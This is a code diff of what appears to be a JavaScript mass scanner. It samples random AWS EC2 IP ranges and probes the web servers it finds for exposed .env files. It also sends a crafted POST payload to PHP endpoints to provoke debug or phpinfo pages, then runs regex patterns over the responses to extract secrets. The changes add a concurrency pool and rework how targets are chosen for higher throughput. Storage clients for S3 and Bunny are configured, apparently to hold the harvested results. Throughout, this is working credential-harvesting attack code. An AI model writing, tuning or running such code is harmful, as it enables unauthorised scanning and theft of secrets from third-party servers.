@@ -40,15 +40,15 @@ var BUNNY_API_KEY = "";
 var LOAD_FROM_SITE = false;
 var LOAD_FROM_CIDR = true;
 var USE_REV = false;
-var MAX_SITE_BATCH = 10;
+var MAX_SITE_BATCH = 8;
 var MAX_LIST_ENV = 20;
 var MAX_LIST_PHP = 20;
 var DNS_WORKERS_EC2 = 200;
-var DNS_TIMEOUT_EC2 = 3;
-var MAX_IPS_PER_CIDR = 3e3;
+var DNS_TIMEOUT_EC2 = 2;
+var TOTAL_IPS_PER_CYCLE = 1e4;
+var NUM_CIDR_PER_CYCLE = 4;
 var TOTAL_SLOTS = 2e3;
-var NUM_WORKERS = 5;
-var MIN_CIDR_IPS = 1e6;
+var NUM_WORKERS = 8;
 var s3Client = new S3Client({
   region: S3_REGION,
   credentials: { accessKeyId: S3_ACCESS_KEY, secretAccessKey: S3_SECRET_KEY },
@@ -73,6 +73,21 @@ var ts = () => (/* @__PURE__ */ new Date()).toISOString().slice(11, 19);
 var log = (...args) => console.log(`[${ts()}]`, ...args);
 var randStr = (len) => crypto.randomBytes(Math.ceil(len / 2)).toString("hex").slice(0, len);
 var sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+async function asyncPool(concurrency, items, fn) {
+  const results = [];
+  const executing = /* @__PURE__ */ new Set();
+  for (const item of items) {
+    const p = Promise.resolve().then(() => fn(item));
+    results.push(p);
+    executing.add(p);
+    const clean = () => executing.delete(p);
+    p.then(clean, clean);
+    if (executing.size >= concurrency) {
+      await Promise.race(executing);
+    }
+  }
+  return Promise.allSettled(results);
+}
 var TeeLogger = class {
   constructor(filepath) {
     this.logfile = fs.createWriteStream(filepath, { flags: "a" });
@@ -376,14 +391,16 @@ async function scanSite(siteLink, isFallback = false) {
     const envBatches = [...generateEnvBatches(siteLink)];
     for (const batch of envBatches) {
       if (fakeForSite || foundForSite) break;
-      const results = await Promise.allSettled(batch.map(
+      const results = await asyncPool(
+        MAX_LIST_ENV,
+        batch,
         (url) => ax.get(url, {
           headers: { ...DEFAULT_HEADERS, "Range": "bytes=0-4096" },
           timeout: 6e3,
           responseType: "text",
           transformResponse: [(data) => data]
         })
-      ));
+      );
       for (const r of results) {
         if (fakeForSite || foundForSite) break;
         if (r.status !== "fulfilled" || !r.value) continue;
@@ -443,13 +460,16 @@ ${content}`);
     const phpBatches = [...generatePhpBatches(siteLink)];
     for (const batch of phpBatches) {
       if (fakeForSite || foundForSite) break;
-      const results = await Promise.allSettled(batch.map(
+      const results = await asyncPool(
+        MAX_LIST_PHP,
+        batch,
         (url) => ax.post(url, "0x01[]=x", {
           headers: { ...DEFAULT_HEADERS, "Range": "bytes=0-4096", "Content-Type": "application/x-www-form-urlencoded" },
           timeout: 6e3,
-          responseType: "arraybuffer"
+          responseType: "text",
+          transformResponse: [(data) => data]
         })
-      ));
+      );
       const uniqueResponses = /* @__PURE__ */ new Map();
       const findFileRequests = [];
       for (const r of results) {
@@ -460,14 +480,14 @@ ${content}`);
         checkeds++;
         const requestUrl = res.config.url;
         if (!uniqueResponses.has(requestUrl)) {
-          const content = Buffer.isBuffer(res.data) ? res.data : Buffer.from(res.data || "");
+          const content = typeof res.data === "string" ? res.data : "";
           const contentLen = content.length;
           if (contentLen < 10 || contentLen > 1e6) continue;
-          const head = content.slice(0, 200).toString("utf8").toLowerCase();
+          const head = content.slice(0, 200).toLowerCase();
           const isHtmlDoc = head.includes("<html") || head.includes("<!doctype");
           let isDebugPage = false;
           if (isHtmlDoc) {
-            const contentStrHead = content.slice(0, 5e3).toString("utf8").toLowerCase();
+            const contentStrHead = content.slice(0, 5e3).toLowerCase();
             const debugKeywords = [
               "phpinfo()",
               "php version",
@@ -510,7 +530,7 @@ ${content}`);
         log(`  [DEEP] ${uniqueResponses.size} valid targets, regex extraction on ${siteLink}`);
         for (const item of findFileRequests) {
           if (!item) continue;
-          const contentsx = item.content.toString("utf8");
+          const contentsx = typeof item.content === "string" ? item.content : item.content.toString("utf8");
           for (const regex of compiledPatterns) {
             if (regex.test(contentsx)) {
               foundForSite = true;
@@ -576,21 +596,30 @@ ${formattedOutput}`);
     }
   }
 }
+var CHK_CONCURRENCY = 20;
 async function processUrls(urlsList, isFallback = false) {
   log(`
 [CHK] Starting scan on ${urlsList.length} URLs (fallback=${isFallback})`);
   for (let i = 0; i < urlsList.length; i += 100) {
     const chunk = urlsList.slice(i, i + 100);
     log(`[CHK] Checking block of ${chunk.length} URLs...`);
-    const results = await Promise.allSettled(chunk.map(
-      (url) => ax.get(getInitialUrl(url), { timeout: 3e3, responseType: "stream" })
-    ));
+    const probes = chunk.map((url) => ({ orig: url, probe: getInitialUrl(url) }));
+    const results = await asyncPool(
+      CHK_CONCURRENCY,
+      probes,
+      ({ probe }) => ax.get(probe, { timeout: 3e3, responseType: "stream" })
+    );
     const hostsBySite = {};
-    for (const r of results) {
+    for (let j = 0; j < results.length; j++) {
+      const r = results[j];
       if (r.status !== "fulfilled" || !r.value) continue;
       const res = r.value;
+      try {
+        res.data.destroy();
+      } catch (_) {
+      }
       if ([200, 403, 206].includes(res.status)) {
-        const siteUrl = getInitialUrl(r.value.config.url);
+        const siteUrl = probes[j].probe;
         if (!hostsBySite[siteUrl]) {
           hostsBySite[siteUrl] = {
             env: [...generateEnvBatches(siteUrl)],
@@ -599,24 +628,31 @@ async function processUrls(urlsList, isFallback = false) {
         }
       }
     }
-    const retryUrls = [];
+    const retryMap = [];
     for (let j = 0; j < results.length; j++) {
       const r = results[j];
       if (r.status !== "fulfilled" || !r.value || ![200, 403, 206].includes(r.value.status)) {
-        const retryU = getRetryUrl(chunk[j]);
-        if (retryU) retryUrls.push(retryU);
+        const retryU = getRetryUrl(probes[j].orig);
+        if (retryU) retryMap.push({ retryUrl: retryU, origUrl: probes[j].orig });
       }
     }
-    if (retryUrls.length > 0) {
-      log(`[CHK] Retrying ${retryUrls.length} URLs in HTTPS...`);
-      const retryResults = await Promise.allSettled(retryUrls.map(
-        (url) => ax.get(url, { timeout: 3e3, responseType: "stream" })
-      ));
-      for (const r of retryResults) {
+    if (retryMap.length > 0) {
+      log(`[CHK] Retrying ${retryMap.length} URLs in HTTPS...`);
+      const retryResults = await asyncPool(
+        CHK_CONCURRENCY,
+        retryMap,
+        ({ retryUrl }) => ax.get(retryUrl, { timeout: 3e3, responseType: "stream" })
+      );
+      for (let j = 0; j < retryResults.length; j++) {
+        const r = retryResults[j];
         if (r.status !== "fulfilled" || !r.value) continue;
         const res = r.value;
+        try {
+          res.data.destroy();
+        } catch (_) {
+        }
         if ([200, 403, 206].includes(res.status)) {
-          const siteUrl = getInitialUrl(res.config.url);
+          const siteUrl = retryMap[j].retryUrl;
           if (!hostsBySite[siteUrl]) {
             hostsBySite[siteUrl] = {
               env: [...generateEnvBatches(siteUrl)],
@@ -713,23 +749,21 @@ function buildCidrPool(cidrs) {
   for (const { cidr, region } of cidrs) {
     try {
       const parts = cidr.split("/");
-      const ip = parts[0];
       const prefix = parseInt(parts[1]);
-      const total = Math.pow(2, 32 - prefix);
-      if (total < MIN_CIDR_IPS) {
+      if (prefix < 11 || prefix > 13) {
         skipped++;
         continue;
       }
-      const ipParts = ip.split(".").map(Number);
+      const total = Math.pow(2, 32 - prefix);
+      const ipParts = parts[0].split(".").map(Number);
       const first = ipParts[0] << 24 | ipParts[1] << 16 | ipParts[2] << 8 | ipParts[3];
       const mask = ~((1 << 32 - prefix) - 1) >>> 0;
       const firstAligned = (first & mask) >>> 0;
-      sources.push({ first: firstAligned, total, region });
+      sources.push({ cidr, first: firstAligned, total, region, prefix });
     } catch (_) {
     }
   }
-  const regionsSet = new Set(sources.map((s) => s.region));
-  log(`[AWS POOL] ${sources.length} CIDRs in ${regionsSet.size} regions (skipped ${skipped} CIDRs <${MIN_CIDR_IPS / 1e6}M IP, max ${MAX_IPS_PER_CIDR} IP/CIDR)`);
+  log(`[AWS POOL] ${sources.length} CIDRs /11-/13 (skipped ${skipped} other prefixes)`);
   return sources;
 }
 function ipFromInt(n) {
@@ -765,25 +799,45 @@ async function verifyEc2Webserver(ip, region) {
   }
 }
 async function gatherAndScanCycle(cidrPool, workerId, numWorkers, cycleNum) {
-  const allIps = [];
-  for (const { first, total, region } of cidrPool) {
-    const rem = ((INSTANCE_ID - first % TOTAL_SLOTS) % TOTAL_SLOTS + TOTAL_SLOTS) % TOTAL_SLOTS;
-    if (rem >= total) continue;
-    const offsetsPool = [];
-    for (let o = rem; o < total; o += TOTAL_SLOTS) offsetsPool.push(o);
-    let chosen;
-    if (MAX_IPS_PER_CIDR >= offsetsPool.length) {
-      chosen = offsetsPool;
+  const shuffledPool = [...cidrPool];
+  for (let i = shuffledPool.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [shuffledPool[i], shuffledPool[j]] = [shuffledPool[j], shuffledPool[i]];
+  }
+  const chosenCidrs = shuffledPool.slice(0, Math.min(NUM_CIDR_PER_CYCLE, shuffledPool.length));
+  const numCidrs = chosenCidrs.length;
+  let remaining = TOTAL_IPS_PER_CYCLE;
+  const quotas = [];
+  for (let c = 0; c < numCidrs; c++) {
+    if (c === numCidrs - 1) {
+      quotas.push(remaining);
     } else {
-      const seed = first * 7919 + cycleNum * 104729;
-      const rng = /* @__PURE__ */ ((s) => () => {
-        s = s * 1664525 + 1013904223 | 0;
-        return (s >>> 0) / 4294967295;
-      })(seed);
-      chosen = offsetsPool.sort(() => rng() - 0.5).slice(0, MAX_IPS_PER_CIDR);
+      const minFor = 1;
+      const maxFor = remaining - (numCidrs - c - 1) * minFor;
+      const q = minFor + Math.floor(Math.random() * (maxFor - minFor + 1));
+      quotas.push(q);
+      remaining -= q;
     }
-    for (const off of chosen) {
-      allIps.push({ ip: ipFromInt(first + off), region });
+  }
+  for (let i = quotas.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [quotas[i], quotas[j]] = [quotas[j], quotas[i]];
+  }
+  if (workerId === 0) {
+    const details = chosenCidrs.map((c, i) => `${c.cidr}:${quotas[i]}`).join(", ");
+    log(`[AWS GATHER #${cycleNum}] Picked ${numCidrs} CIDRs, ${TOTAL_IPS_PER_CYCLE} IPs split: ${details}`);
+  }
+  const allIps = [];
+  for (let c = 0; c < numCidrs; c++) {
+    const { first, total, region } = chosenCidrs[c];
+    const take = Math.min(quotas[c], total);
+    const seen = /* @__PURE__ */ new Set();
+    while (seen.size < take) {
+      const off = Math.floor(Math.random() * total);
+      if (!seen.has(off)) {
+        seen.add(off);
+        allIps.push({ ip: ipFromInt(first + off), region });
+      }
     }
   }
   for (let i = allIps.length - 1; i > 0; i--) {
@@ -796,7 +850,7 @@ async function gatherAndScanCycle(cidrPool, workerId, numWorkers, cycleNum) {
     [myIps[i], myIps[j]] = [myIps[j], myIps[i]];
   }
   if (workerId === 0) {
-    log(`[AWS GATHER #${cycleNum}] Shard ${INSTANCE_ID}/${TOTAL_SLOTS}, ${allIps.length} IPs, split among ${numWorkers} workers (~${Math.floor(myIps.length / numWorkers)} each)`);
+    log(`[AWS GATHER #${cycleNum}] ${allIps.length} IPs total, split among ${numWorkers} workers (~${Math.floor(allIps.length / numWorkers)} each)`);
   }
   const seenUrls = /* @__PURE__ */ new Set();
   let hits = 0, processed = 0, lastPct = -1;
@@ -819,8 +873,13 @@ async function gatherAndScanCycle(cidrPool, workerId, numWorkers, cycleNum) {
       log(`[W${workerId} GATHER #${cycleNum}] ${pct}% (${processed}/${totalMy}) \u2014 ${hits} webservers, ${processed - hits} discarded`);
     }
   }
-  const urls = [...seenUrls].filter((u) => !scannedUrlsGlobal.has(u));
-  urls.forEach((u) => scannedUrlsGlobal.add(u));
+  const urls = [];
+  for (const u of seenUrls) {
+    if (!scannedUrlsGlobal.has(u)) {
+      scannedUrlsGlobal.add(u);
+      urls.push(u);
+    }
+  }
   for (let i = urls.length - 1; i > 0; i--) {
     const j = Math.floor(Math.random() * (i + 1));
     [urls[i], urls[j]] = [urls[j], urls[i]];
@@ -911,7 +970,7 @@ async function main() {
   await fs.promises.mkdir(NEW_PATH_EXTRACT, { recursive: true });
   log(`[SYS] AWS_S3=${AWS_S3}  BUNNY_STORAGE=${BUNNY_STORAGE}`);
   log(`[SYS] LOAD_FROM_SITE=${LOAD_FROM_SITE}  LOAD_FROM_CIDR=${LOAD_FROM_CIDR}`);
-  log(`[SYS] Container-ID=${INSTANCE_ID} (of ${TOTAL_SLOTS} slots), ${NUM_WORKERS} workers, ~${MAX_IPS_PER_CIDR} IP/CIDR`);
+  log(`[SYS] ${NUM_CIDR_PER_CYCLE} random CIDRs/cycle (/11-/13), ${TOTAL_IPS_PER_CYCLE} total IPs/cycle, ${NUM_WORKERS} workers`);
   if (!LOAD_FROM_SITE && !LOAD_FROM_CIDR) {
     log("[SYS] ERROR: LOAD_FROM_SITE=false and LOAD_FROM_CIDR=false. No target source. Exiting.");
     return;
